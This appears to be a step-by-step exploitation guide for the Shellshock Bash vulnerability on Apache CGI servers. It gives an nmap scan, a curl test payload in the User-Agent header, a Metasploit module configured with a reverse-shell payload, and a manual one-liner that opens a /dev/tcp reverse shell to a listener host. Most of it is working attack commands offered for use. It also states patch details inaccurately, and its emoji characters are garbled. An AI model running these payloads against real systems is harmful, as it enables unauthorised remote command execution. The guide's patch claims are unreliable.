# Exploitation Workflow

## ðŸ” Step 1: Identify Target

- Target must run **Bash** (Linux/Unix only).
- Common vector: **Apache + CGI scripts**.

### Scan for HTTP + CGI

```bash
nmap -sV -p 80,443 --script=http-enum 192.168.1.10
```

â†’ Look for paths like `/cgi-bin/`, `/cgi-bin/status`, `/cgi-bin/test.sh`

> ðŸ’¡ Shellshock **only works if CGI is enabled** and uses Bash.

---
## ðŸ§ª Step 2: Manual Test for Vulnerability

Use `curl` to send malicious User-Agent:

```bash
curl -H "User-Agent: () { :; }; echo; echo 'VULNERABLE'" http://192.168.1.10/cgi-bin/test.sh
```

âœ… If you see `VULNERABLE` in response â†’ **vulnerable**.

> ðŸŽ¯ The payload `() { :; };` triggers Bash to execute what follows.

---
## ðŸ’¥ Step 3: Exploit with Metasploit (Recommended)

### Launch MSF

```msf
msfconsole
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 192.168.1.10
set TARGETURI /cgi-bin/test.sh   # from Step 1
set PAYLOAD linux/x86/shell_reverse_tcp
set LHOST 192.168.1.5
exploit
```

âœ… Success: Reverse shell as **www-data** or Apache user.

---
## ðŸ› ï¸ Step 4: Manual Exploit (Alternative)

Get reverse shell without MSF:

```bash
# Start listener
nc -nvlp 4444

# Trigger reverse shell
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.1.5/4444 0>&1" \
  http://192.168.1.10/cgi-bin/test.sh
```

> âš ï¸ Ensure `/dev/tcp` is available (most Linux distros support it).

---
## ðŸ”‘ Key Notes

- **Only affects Linux/Unix** (Windows not vulnerable).
- Requires **CGI script execution via Bash**.
- Gives **command execution as the web server user** (often low-priv â†’ escalate later).
- Patched in **Bash 4.3+** â€” but many legacy systems remain exposed.

> âœ… Shellshock = **RCE via HTTP header** â†’ one of the easiest remote exploits in history.

